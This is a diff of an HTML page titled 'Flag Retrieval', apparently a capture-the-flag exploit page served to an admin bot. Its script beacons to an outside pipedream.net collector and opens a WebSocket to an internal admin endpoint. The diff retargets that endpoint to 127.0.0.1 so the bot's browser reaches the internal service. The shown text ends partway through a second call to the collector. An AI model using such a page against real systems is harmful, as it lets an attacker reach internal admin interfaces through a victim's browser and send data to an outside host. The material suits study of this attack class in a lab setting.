@@ -5,14 +5,14 @@
     <title>Flag Retrieval</title>
 </head>
 <body>
-    <script type="module">
+    <script>
         fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ message: "Bot accessed HTML page" })
         });
 
-        const ws = new WebSocket('ws://web:8080/admin/ws');
+        const ws = new WebSocket('ws://127.0.0.1:8080/admin/ws');
 
         fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
             method: 'POST',
